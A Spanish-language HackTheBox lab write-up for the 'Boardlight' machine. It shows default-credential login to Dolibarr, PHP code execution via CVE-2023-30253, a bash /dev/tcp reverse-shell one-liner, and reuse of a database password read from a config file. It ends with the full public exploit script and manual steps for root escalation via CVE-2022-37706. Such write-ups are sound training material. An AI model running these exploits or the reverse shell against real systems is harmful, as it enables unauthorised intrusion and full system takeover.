---
title: "Máquina Boardlight"
description: "Resolución de la máquina Boardlight de HackTheBox"
tags: ["Default credentials", "CVE-2023-30253", "Stored credentials", "CVE-2022-37706"]
categories: ["HackTheBox", "Easy", "Linux"]
logo: "/assets/writeups/boardlight/logo.webp"
---

Un sitio de hospedaje utiliza un Dolibarr antiguo que está expuesto a una vulnerabilidad en la que se puede modificar la página para inyectar código PHP, luego de encontrar las credenciales de un usuario en la máquina escalaremos privilegios abusando del Enlightment de Ubuntu.

## Reconocimiento

La máquina tiene solamente dos puertos abiertos

```bash
# Nmap 7.94 scan initiated Sat May 25 15:00:48 2024 as: nmap -sS -Pn -n -p- --open -oN ports --min-rate 300 -vvv 10.10.11.11
Nmap scan report for 10.10.11.11
Host is up, received user-set (0.47s latency).
Scanned at 2024-05-25 15:00:49 -04 for 248s
Not shown: 54106 closed tcp ports (reset), 11427 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat May 25 15:04:57 2024 -- 1 IP address (1 host up) scanned in 248.11 seconds
```

El servidor web nos manda a `board.htb`, por lo que vamos a agregarlo a nuestro archivo de hosts

```bash
10.10.11.11 board.htb
```
{: file="/etc/hosts" }

Nos dice cosas:

![Web](/assets/writeups/boardlight/1.png)

Pero a pesar de decirnos varias cosas sobre quienes crearon esta web, no tenemos nada útil que podamos explotar... por lo que vamos a tener que fuzzear un poco.

## Intrusión

### www-data - boardlight

Si fuzzeamos por subdominios, encontraremos uno nuevo:

```bash
❯ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.board.htb" -fs 15949 -mc all -u http://10.10.11.11

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.11
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 475ms]
```

Al agregarlo a nuestro archivo de hosts y entrar, encontraremos esto:

![Dolibarr](/assets/writeups/boardlight/2.png)

Es un ERP (Enterprise Resource Planning) llamado Dolibarr, en su versión 17.0.0, que buscando por vulnerabilidades encontramos una catalogada como CVE-2023-30253

> Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation: <?PHP instead of <?php in injected data.

Pero para explotarla necesitamos autenticarnos, sin embargo buscando por las credenciales que vienen por defecto, encontramos que un par puede ser `admin:admin`... y funciona sin problemas en el sitio.

![Admin](/assets/writeups/boardlight/3.png)

Ahora necesitaremos crear un sitio web y activarle el modo dinámico, al hacerlo simplemente inyectaremos cualquier código php en la página que creemos solo que, la etiqueta que abre el bloque de código la escribiremos en mayúscula, seáse:

```php
<?PHP
  // Execute some command
  system("/usr/bin/do_something");
>
```

Al hacerlo y colocarle el comando `ls -la` por ejemplo, nos lo ejecutará y podremos ver la salida:

![RCE](/assets/writeups/boardlight/4.png)

Ahora simplemente podemos lanzarnos una reverse shell con `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'`

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.11 50506
bash: cannot set terminal process group (857): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ script /dev/null -c bash # Inicar nuevo proceso para alocar una tty
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ script /dev/null -c bash     
Script started, file is /dev/null
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ ^Z # CTRL + Z
[1]  + 5737 suspended  nc -lvnp 443

❯ stty raw -echo; fg # Pasar controles de la terminal al proceso
[1]  + 5737 continued  nc -lvnp 443
                                   reset xterm # Reiniciar la terminal
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ export TERM=xterm-256color # Establecer el tipo de terminal
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ stty rows 34 columns 149 # Ajustar tamaño de la terminal en base a filas y columnas
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ source /etc/skel/.bashrc # Darle colorsito
```

### larissa - boardlight

Viendo los archivos del ERP en cuestión, podemos encontrar las credenciales para acceder a la DB en `/var/www/html/crm.board.htb/htdocs/conf/conf.php`:

```php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
```
{: file="conf.php"}

Accediendo al MySQL con las credenciales no podremos encontrar nada interesante además de dos hashes que no parecen ser de contraseñas débiles, pero probando esta contraseña con el usuario larissa nos permite acceder como él:

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
Password: 
larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$
```

En el directorio personal de este usuario ya podremos encontrar la primera flag.

```bash
larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ cd
larissa@boardlight:~$ ls -la
total 76
drwxr-x--- 15 larissa larissa 4096 May 17 01:04 .
drwxr-xr-x  3 root    root    4096 May 17 01:04 ..
lrwxrwxrwx  1 root    root       9 Sep 18  2023 .bash_history -> /dev/null
-rw-r--r--  1 larissa larissa  220 Sep 17  2023 .bash_logout
-rw-r--r--  1 larissa larissa 3771 Sep 17  2023 .bashrc
drwx------  2 larissa larissa 4096 May 17 01:04 .cache
drwx------ 12 larissa larissa 4096 May 17 01:04 .config
drwxr-xr-x  2 larissa larissa 4096 May 17 01:04 Desktop
drwxr-xr-x  2 larissa larissa 4096 May 17 01:04 Documents
drwxr-xr-x  3 larissa larissa 4096 May 17 01:04 Downloads
drwxr-xr-x  3 larissa larissa 4096 May 17 01:04 .local
drwxr-xr-x  2 larissa larissa 4096 May 17 01:04 Music
lrwxrwxrwx  1 larissa larissa    9 Sep 18  2023 .mysql_history -> /dev/null
drwxr-xr-x  2 larissa larissa 4096 May 17 01:04 Pictures
-rw-r--r--  1 larissa larissa  807 Sep 17  2023 .profile
drwxr-xr-x  2 larissa larissa 4096 May 17 01:04 Public
drwx------  2 larissa larissa 4096 May 17 01:04 .run
drwx------  2 larissa larissa 4096 May 17 01:04 .ssh
drwxr-xr-x  2 larissa larissa 4096 May 17 01:04 Templates
-rw-r-----  1 root    larissa   33 Sep 28 02:09 user.txt
drwxr-xr-x  2 larissa larissa 4096 May 17 01:04 Videos
larissa@boardlight:~$ cat user.txt
48a303435230982fb510f775e3******
```

## Escalada de privilegios

No parece que tengamos algún privilegio especial además de pertenecer al grupo `adm`, pero viendo los binarios SUID existentes:

```bash
larissa@boardlight:~/Downloads$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

Viendo la propiedad de los `enlightenment`:

```bash
larissa@boardlight:~/Downloads$ ls -la /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment*
-rwxr-xr-x 1 root root  35224 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_alert
-rwsr-xr-x 1 root root  14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
-rwsr-xr-x 1 root root  14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
-rwxr-xr-x 1 root root  14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_elm_cfgtool
-rwxr-xr-x 1 root root 104768 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_fm
-rwxr-xr-x 1 root root  35152 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_fm_op
-rwxr-xr-x 1 root root  18744 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_static_grabber
-rwsr-xr-x 1 root root  26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
-rwxr-xr-x 1 root root  35128 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_thumb
```

Enlightenment es un gestor de ventanas que funciona ya sea en X11 o Wayland, y buscando por vulnerabilidades encontraremos el CVE-2022-37706:

> The Enlightenment Version: 0.25.3 is vulnerable to local privilege escalation.
> Enlightenment_sys in Enlightenment before 0.25.3 allows local users to
> gain privileges because it is setuid root,
> and the system library function mishandles pathnames that begin with a
> /dev/.. substring

Podemos encontrar un PoC público para abusar de la vulnerabilidad, y analizándolo podemos ver que es muy sencillo... ([tomado de acá](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit))

```bash
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

Por lo que podemos simplemente ejecutarlo o hacerlo manual:

```bash
larissa@boardlight:~/Downloads$ mkdir -p /tmp/net
larissa@boardlight:~/Downloads$ mkdir -p "/dev/../tmp/;/tmp/exploit"
larissa@boardlight:~/Downloads$ echo "/bin/bash" > /tmp/exploit
larissa@boardlight:~/Downloads$ chmod +x /tmp/exploit
larissa@boardlight:~/Downloads$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
mount: /dev/../tmp/: can't find in /etc/fstab.
root@boardlight:/home/larissa/Downloads#
```

Con esto ya podremos tomar la última flag.

```bash
root@boardlight:/home/larissa/Downloads# cd /root
root@boardlight:/root# ls -la
total 44
drwx------  8 root root    4096 Sep 28 02:09 .
drwxr-xr-x 19 root root    4096 May 17 01:04 ..
lrwxrwxrwx  1 root root       9 May 16 23:27 .bash_history -> /dev/null
-rw-r--r--  1 root root    3106 Dec  5  2019 .bashrc
drwx------  6 root root    4096 May  2 05:47 .cache
drwx------  7 root root    4096 Sep 17  2023 .config
drwx------  3 root root    4096 Sep 17  2023 .dbus
drwxr-xr-x  3 root root    4096 Sep 17  2023 .local
lrwxrwxrwx  1 root root       9 May 16 23:27 .mysql_history -> /dev/null
-rw-r--r--  1 root root     161 Dec  5  2019 .profile
drwx------  2 root larissa 4096 Sep 17  2023 .run
-rw-r-----  1 root root      33 Sep 28 02:09 root.txt
drwxr-xr-x  3 root root    4096 Sep 17  2023 snap
root@boardlight:/root# cat root.txt
846f1e8c95fb3b5aa8e1590198******
```







